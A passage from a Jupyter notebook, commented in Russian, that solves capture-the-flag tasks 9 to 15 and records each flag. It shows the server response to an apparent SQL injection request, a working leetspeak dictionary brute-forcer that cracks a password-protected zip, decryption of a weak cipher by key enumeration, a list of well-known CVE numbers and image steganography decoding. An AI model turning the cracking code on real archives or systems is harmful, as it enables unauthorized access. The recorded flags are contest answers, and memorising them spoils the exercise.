      "Content-Length: 308\n",
      "Connection: keep-alive\n",
      "etag: \"jr9N3UFu9oJgkYAWFzVdUA\"\n",
      "\n",
      "<html>\n",
      "        <head>\n",
      "          <title>Z10N</title>\n",
      "        </head>\n",
      "        <body>\n",
      "          <h1>Hello, server datetime =\n",
      "            28-07-2023 19:14:26\n",
      "          </h1>\n",
      "          <pre>Map(ID -&gt; 1, NAME -&gt; Z10N{sq1_inj3cti0n_i$_v3ry_us3fu11_ski11})</pre>\n",
      "          <p></p>\n",
      "        </body>\n",
      "      </html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   308  100   308    0     0   4967      0 --:--:-- --:--:-- --:--:--  4967\n"
     ]
    }
   ],
   "source": [
    "!curl -i $injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 183,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_9='Z10N{sq1_inj3cti0n_i$_v3ry_us3fu11_ski11}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 184,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{sq1_inj3cti0n_i$_v3ry_us3fu11_ski11}'"
      ]
     },
     "execution_count": 184,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_9"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №10"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 185,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTTP/1.1 200 OK\n",
      "Server: nginx/1.18.0\n",
      "Date: Fri, 28 Jul 2023 16:14:27 GMT\n",
      "Content-Type: text/html; charset=UTF-8\n",
      "Content-Length: 611\n",
      "Connection: keep-alive\n",
      "etag: \"pRZI_8IeuxMSIJIMbBho0w\"\n",
      "\n",
      "<html><head><title>Z10N</title></head><body><h1>Hello, server datetime = 28-07-2023 19:14:27</h1><hr/><div>Sample specification</div><br/><form method=\"POST\" action=\"/\" id=\"transform\"><textarea rows=\"30\" cols=\"100\" name=\"spec\" form=\"transform\">[ {\n",
      "  \"operation\" : \"shift\",\n",
      "  \"spec\" : {\n",
      "    \"builder\" : {\n",
      "      \"conditions\" : {\n",
      "        \"208fde59-7d0e-4692-a4be-b000eff8aedd\" : {\n",
      "          \"propertyId\" : \"resultId\"\n",
      "        }\n",
      "      }\n",
      "    }\n",
      "  }\n",
      "} ]</textarea><p><input type=\"submit\"/></p></form> <hr/> <div>Result of your specification: {\n",
      "  \"resultId\" : \"12dc5ccb-3065-42dc-adf9-534ce01bd87e\"\n",
      "}</div></body></html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   611  100   611    0     0   9854      0 --:--:-- --:--:-- --:--:--  9854\n"
     ]
    }
   ],
   "source": [
    "# Как оказалось, требуется в форме submit использовать 'sort' операцию. Решение есть ... но осознание еще в пути.\n",
    "!curl -i https://z1on-a6e9.apps.prom-gen1-as.sigma.sbrf.ru/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 186,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_10='Z10N{jolt-flag-was}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 187,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{jolt-flag-was}'"
      ]
     },
     "execution_count": 187,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_10"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №11"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Дан запароленый архив с флагом и подсказки : \n",
    "\n",
    "1) Элитный инженер - отсылка к l33t или 1337 алфавиту для записи пароля к архиву .\n",
    "\n",
    "2) Любовь к фруктам и животным - поддталкивает к ограничению вариантов составного пароля использованием названия животного и какого-то фрукта.\n",
    "\n",
    "3) Грубая сила - прямое руководство для перебора паролей"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#Посмотрим на архив, чтобы убедиться что меред нами действительно zip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 189,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b\"PK\\x03\\x04\\x14\\x00\\x01\\x00\\x08\\x00}^\\xb2V-d\\x90 .\\x00\\x00\\x00 \\x00\\x00\\x00\\x08\\x00\\x00\\x00flag.txt\\xfe\\xd2\\xa7YpD\\xca@\\xa3E[\\xbb>\\x93\\t(\\xb8\\xab\\x10\\xfe!=E\\xfa\\xdd\\xd3\\x11\\x80\\x0b\\x15\\xf8\\x8856'\\xd8\\xa6N:\\xf5\\xac\\x01\\xfa\\xb2\\xce\\xfaPK\\x01\\x02\\x00\\x00\\x14\\x00\\x01\\x00\\x08\\x00}^\\xb2V-d\\x90 .\\x00\\x00\\x00 \\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00flag.txtPK\\x05\\x06\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x006\\x00\\x00\\x00T\\x00\\x00\\x00\\x00\\x00\"\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "import zipfile\n",
    "import zlib\n",
    "print(open(TASK11_PATH,'rb').read())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Составим сначала список названий животных и фруктов."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 191,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "arc = zipfile.ZipFile(TASK11_PATH)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 192,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['bananarabbit',\n",
       " 'bananapanda',\n",
       " 'bananahorse',\n",
       " 'bananadog',\n",
       " 'bananawolf',\n",
       " 'bananalion',\n",
       " 'bananatiger',\n",
       " 'bananacat',\n",
       " 'bananacheetah',\n",
       " 'graperabbit',\n",
       " 'grapepanda',\n",
       " 'grapehorse']"
      ]
     },
     "execution_count": 192,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# С одной стороны нет никакой информации о количестве потенциальных животных и фруктов , \n",
    "# с другой стороны, учитывая временные ограничения количество вариантов на перебор не должно превышать 10 млн. вариантов пароля,\n",
    "# поэтому нужно ограничиться минимально необходимым списком кандидатов для первой попытки.\n",
    "\n",
    "fruits=['banana', 'grape', 'apple', 'pineapple', 'lemon', 'orange', 'grapefruit', 'watermelon', 'mango']\n",
    "animals=['rabbit', 'panda', 'horse', 'dog', 'wolf', 'lion', 'tiger', 'cat', 'cheetah']\n",
    "\n",
    "frunimals = [(x,y) for x in fruits for y in animals]\n",
    "voc = [ x[0] + x[1] for x in (frunimals) ]\n",
    "voc[:12]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 193,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# составляем алфавит из открытых источников, для задачи он избыточен , но и не такой шарокий , каким может оказаться в общем случае\n",
    "alphabet = {\n",
    "    'a' : ['A','a','@','4'],\n",
    "    'b' : ['B','b','8','6'],\n",
    "    'c' : ['C','c'],\n",
    "    'd' : ['D','d'],\n",
    "    'e' : ['3'],\n",
    "    'f' : ['F','f'],\n",
    "    'g' : ['G','g','9'],\n",
    "    'h' : ['H','h'],\n",
    "    'i' : ['1'],\n",
    "    'j' : ['J','j'],\n",
    "    'k' : ['K','k'],\n",
    "    'l' : ['L','l'],\n",
    "    'm' : ['M','m'],\n",
    "    'n' : ['N','n'],\n",
    "    'o' : ['O','o','0'],\n",
    "    'p' : ['P','p'],\n",
    "    'q' : ['Q','q'],\n",
    "    'r' : ['R','r'],\n",
    "    's' : ['S','s','5'],\n",
    "    't' : ['T','t','7'],\n",
    "    'u' : ['U','u'],\n",
    "    'v' : ['V','v'],\n",
    "    'w' : ['W','v'],\n",
    "    'x' : ['X','x'],\n",
    "    'y' : ['Y','y'],\n",
    "    'z' : ['Z','z','2'],\n",
    "    ' ' : ['_']\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 194,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# функция генерации вариантов пароля по словарю. на входе пароль в plaint text и алфавит в виде словаря на выходе массив вариаций паролей \n",
    "def get_encode(word, alpha):\n",
    "    temp = ['']\n",
    "    for symbol in word:\n",
    "        letter_variants = alpha[symbol]\n",
    "        temp = [ x+y for x in temp for y in letter_variants ]\n",
    "    return temp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 195,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# на входе словарь стандартных паролей  и объект zipfile архива \n",
    "def find_pass(voc,zipf):\n",
    "    cur_time = time.clock() \n",
    "    i = 1\n",
    "    sw = 0\n",
    "    for word in voc:  # для каждого слова из словаря\n",
    "        for password in get_encode(word, alphabet): # для каждой вариации пароля проверяем чтение архива. Если архив \n",
    "                                          # прочитан , то выводим подошедший пароль и содержание файла из архива.            \n",
    "            if sw == 1:\n",
    "                print('Correct password {} found in {} seconds:'.format(pwd,time.clock() - cur_time))\n",
    "                result= ''.join([ chr(i) for i in result ])\n",
    "                print('flag :' + result)\n",
    "                return result\n",
    "            try:\n",
    "                if i%100000 == 0:\n",
    "                    print( '{}'.format(i) + ' attemts done in {:f}'.format(time.clock() - cur_time))            \n",
    "                result = zipf.read('flag.txt',bytes(password,'utf-8'))\n",
    "                pwd = password\n",
    "                sw = 1\n",
    "            except RuntimeError: # обработаем эксепшн при неверном пароле\n",
    "                i += 1\n",
    "                pass\n",
    "            except Exception: # обработаем общий эксепшн\n",
    "                i += 1\n",
    "                pass\n",
    "    print('No password matches')\n",
    "    return 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 196,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "100000 attemts done in 7.395779\n",
      "200000 attemts done in 14.816533\n",
      "300000 attemts done in 22.293475\n",
      "400000 attemts done in 29.631368\n",
      "500000 attemts done in 36.784069\n",
      "Correct password b4n4n4h0rs3 found in 39.81757070000003 seconds:\n",
      "flag :Z10N{y0u_ar3_k33n_0n_brut3f0rce}\n"
     ]
    }
   ],
   "source": [
    "# Грубая сила в действии \n",
    "flag_11 = find_pass(voc,arc)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 197,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{y0u_ar3_k33n_0n_brut3f0rce}'"
      ]
     },
     "execution_count": 197,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_11"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №12"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x17ac93fc240>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Смотрим на картинку , видим шифр формата Z10N{...}. Легко можно пойти по \"ложному следу\" если предположить несколько допущений:\n",
    "# Черный цвет - буквы , Белый цвет - цифры. тогда Z10N - дает уже информацию о некоторых символах алфавита ... \n",
    "# но далее поиск не дает результата, так как первичное допущение было ошибочным. \n",
    "\n",
    "from matplotlib import pyplot as plt\n",
    "\n",
    "plt.figure(figsize=(12.0,4.0))\n",
    "plt.title(\"Task12 Image\")\n",
    " \n",
    "image = plt.imread(TASK12_PATH)\n",
    "plt.imshow(image)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 199,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Решение задачи оказалось абсолютно тривиальным - поиск шрифта на котором написам ответ . \n",
    "# Шрифт в себе содержит некоторую структуру , но без явного маппинга символов однозначно не декодируется. \n",
    "# Поэтому используем авторский шрифт.\n",
    "\n",
    "url = 'https://www.fontspace.com/fez-font-f15474'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 200,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_12 = 'Z10N{vErYsTrAnGeFoNt}'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание 13"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 201,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import os\n",
    "from typing import Tuple\n",
    "\n",
    "\n",
    "def bit_partition(n: int) -> Tuple[int, int]:\n",
    "    return (n >> 4), (n & 0x0F)\n",
    "\n",
    "\n",
    "def encrypt_symbol(n: int, key1: int, key2: int) -> int:\n",
    "    m, l = bit_partition(n)\n",
    "    e = (((m + key1) % 16) << 4) | ((l + key2) % 16)\n",
    "    return e\n",
    "\n",
    "def encrypt_flag(flag: str, alpha: str) -> str:\n",
    "    assert all(x in alpha for x in flag)\n",
    "\n",
    "    otp = int(os.urandom(1).hex(), 16)\n",
    "    upper_bits, lower_bits = bit_partition(otp)\n",
    "\n",
    "    cipher = []\n",
    "\n",
    "    for i, ch in enumerate(flag):\n",
    "        if i % 3 == 0:\n",
    "            enc = encrypt_symbol(ord(ch), upper_bits, lower_bits)\n",
    "        elif i % 3 == 1:\n",
    "            enc = encrypt_symbol(ord(ch), lower_bits, upper_bits)\n",
    "        else:\n",
    "            enc = encrypt_symbol(ord(ch), upper_bits, upper_bits)\n",
    "        cipher.append(enc)\n",
    "\n",
    "    cipher = bytes(cipher).hex()\n",
    "    \n",
    "    return cipher\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 202,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"\\nsecret_flag = open('flag.txt').read().lstrip('Z10N{').rstrip('}')\\nalpha = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'\\nencrypted_flag = encrypt_flag(secret_flag, alpha)\\nopen('out.txt', 'w').write(f'{encrypted_flag}')\\n\""
      ]
     },
     "execution_count": 202,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "secret_flag = open('flag.txt').read().lstrip('Z10N{').rstrip('}')\n",
    "alpha = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'\n",
    "encrypted_flag = encrypt_flag(secret_flag, alpha)\n",
    "open('out.txt', 'w').write(f'{encrypted_flag}')\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 203,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "arr_bits = []\n",
    "for i in range(256):\n",
    "    arr_bits.append(bit_partition(i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 204,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "coded = 'da46dbb077d89465c8928ab5d47e97c78a97cf7db5ce77d9d549d8'\n",
    "alpha = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 205,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "arr_alpha = []\n",
    "for i in alpha:\n",
    "    arr_bits.append(bit_partition(ord(i)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 206,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# составляем возможные строки декодирования\n",
    "answers = []\n",
    "for ub,lb in arr_bits:\n",
    "    res = ''\n",
    "    for i,j in enumerate(range(0,len(coded),2)):\n",
    "        #print('Number:' + str(i))\n",
    "        if i % 3 == 0:\n",
    "            for a in alpha:\n",
    "                enc = encrypt_symbol(ord(a), ub,lb )                \n",
    "                #print(coded[j:j+2],chr(enc))\n",
    "                if bytes([enc]).hex() == coded[j:j+2]:\n",
    "                    #print ('{} symbol is {} upper_bits {} lower_bits {}'.format(i,a,ub,lb))\n",
    "                    res += a\n",
    "        elif i % 3 == 1:\n",
    "            for a in alpha:\n",
    "                enc = encrypt_symbol(ord(a), lb, ub)     \n",
    "                if bytes([enc]).hex() == coded[j:j+2]:\n",
    "                    #print ('{} symbol is {} upper_bits {} lower_bits {}'.format(i,a,ub,lb))\n",
    "                    res += a\n",
    "        else:\n",
    "            for a in alpha:\n",
    "                enc = encrypt_symbol(ord(a), ub, ub)     \n",
    "                if bytes([enc]).hex() == coded[j:j+2]:\n",
    "                    #print ('{} symbol is {} upper_bits {} lower_bits {}'.format(i,a,ub,lb)) \n",
    "                    res += a\n",
    "    answers.append([[ub,lb],res])\n",
    "    \n",
    "    \n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 207,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[6, 0] zuPqr4ob2_tx1g1ow_nqsuCr\n",
      "[6, 1] y0u_ar3_b1t_sh1ft1ng_mast3r\n",
      "[6, 2] xuQr2Ob0d_rX1ed1mW_lQssr\n",
      "[6, 3] wuAr1bT_qH1dT1lG_kAsrr\n",
      "[6, 4] vu1r0bD_p81cD1k7_j1sqr\n",
      "[6, 1] y0u_ar3_b1t_sh1ft1ng_mast3r\n",
      "[6, 2] xuQr2Ob0d_rX1ed1mW_lQssr\n",
      "[6, 3] wuAr1bT_qH1dT1lG_kAsrr\n",
      "[6, 4] vu1r0bD_p81cD1k7_j1sqr\n"
     ]
    }
   ],
   "source": [
    "# выбираем значение флага\n",
    "for i,j in answers :\n",
    "    if len(j) >20:\n",
    "        print(i,j)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 208,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_13 = 'Z10N{y0u_ar3_b1t_sh1ft1ng_mast3r}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 209,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{y0u_ar3_b1t_sh1ft1ng_mast3r}'"
      ]
     },
     "execution_count": 209,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_13"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №14"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 210,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Здесь только поисковик и сарафанное радио )))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 211,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#1. Уязвимость заставляла сердце системы кровоточить, разглашая секреты, скрытые под вуалью безопасности\n",
    "g1 = 'CVE-2014-0160'\n",
    "#2. Как и величественные синие океаны, эта уязвимость вечна\n",
    "g2 = 'CVE-2017-0144'\n",
    "#3. Она убивает не одного, а двух сразу, не оставляя шансов на спасение\n",
    "g3 = 'CVE-2018-8174'\n",
    "#4. Хранитель должен бороться со злом, но этот синий хранитель проломил защиту старых версий Windows\n",
    "g4 = 'CVE-2019-0708'\n",
    "#5. Названная в честь неприятной ситуации, эта уязвимость распространила в Citrix хаос CVE-2019-19781\n",
    "g5 = 'CVE-2019-19781'\n",
    "#6. Зимой 2020 года один коварный кривой мяч выкатился на игровое поле криптографии Windows. С его непредсказуемыми отскоками разрушились стены доверия, заставив переосмыслить правила игры.\n",
    "g6 = 'CVE-2020-0601'\n",
    "#7. В марте того же года, тихий призрак появился в коридорах SMB, проникая сквозь стены\n",
    "g7 = 'CVE-2020-0796'\n",
    "#8. в 2021 году появился барон, умевший искусно обращаться с инструментами sudo, взяв под свой контроль множество королевств\n",
    "g8 = 'CVE-2021-3156'\n",
    "#9. В августе 2020 года, в тенистых уголках протокола Netlogon, нули встали в ряд, создавая зияющую бездну в системе аутентификации\n",
    "g9 = 'CVE-2020-1472'\n",
    "#10. Кто бы мог подумать, что корова может вызвать серьезные проблемы в ядре Linux?\n",
    "g10 = 'CVE-2016-5195'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 212,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "codes = g1[4:] + '_' + g2[4:] +'_' + g3[4:] +'_' + g4[4:] +'_' + g5[4:] +'_' + g6[4:] +'_' + g7[4:] +'_' + g8[4:] +'_' + g9[4:] +'_' + g10[4:] "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 213,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_14 = 'Z10N{' +'{}'.format(codes) +'}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 214,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{2014-0160_2017-0144_2018-8174_2019-0708_2019-19781_2020-0601_2020-0796_2021-3156_2020-1472_2016-5195}'"
      ]
     },
     "execution_count": 214,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_14"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №15"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 215,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from matplotlib import pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 216,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x2159032aeb8>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(24.0,8.0))\n",
    "plt.title(\"Task15 Image\")\n",
    "plt.xlabel(\"X\")\n",
    "plt.ylabel(\"Y\")\n",
    " \n",
    "image = plt.imread(TASK15_PATH)\n",
    "plt.imshow(image)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 217,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "for i in range(len(image)):\n",
    "    for j in range(len(image[i])):\n",
    "        if image[i][j][0] > 0 and image[i][j][0] < 1:\n",
    "            image[i][j][2] = 1 - image[i][j][0]\n",
    "            image[i][j][0] = 0\n",
    "        elif image[i][j][0] == 1:\n",
    "            image[i][j][0] = 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 218,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def show_deep(img):\n",
    "    arr = np.array(img).flatten()\n",
    "    for i in range(2,len(arr),3):\n",
    "        if arr[i] == 0:\n",
    "            arr[i] = arr[i-1] = arr[i-2] = 0\n",
    "        else:\n",
    "            arr[i] = arr[i-1] = arr[i-2] = 1\n",
    "    return arr.reshape(480,720,3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 219,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x2159032aba8>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# долго сморим на звездное небо и думаем о прекрасном !!!\n",
    "plt.figure(figsize=(24.0,8.0))\n",
    "plt.imshow(show_deep(image))\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 220,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import numpy as np"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 221,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "arr = np.array(image).flatten()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 222,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "seq = [ arr[i] for i in range(2,len(arr),3)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 223,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Когда достигли просветления , очищаем от белого шума полезный сигнал :) и разворачиваем направление\n",
    "res = []\n",
    "for i in list(reversed(seq)):\n",
    "    if i > 0:\n",
    "        res.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 224,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# переводим в бинарный формат\n",
    "code = ''.join([ '{}'.format(1) if i < 0.005 else '{}'.format(0) for i in res ])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 225,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# побайтого декодируем символ из бинарного представления.\n",
    "flag_15 = ''\n",
    "for i in range(len(code)//8):\n",
    "    flag_15+=chr(int(code[i*8:(i+1)*8],2))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 226,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{p1ll_sh0ws_y0u_h0w_d33p_th3_r4bb1t_h0l3_g03s}'"
      ]
     },
     "execution_count": 226,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_15"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
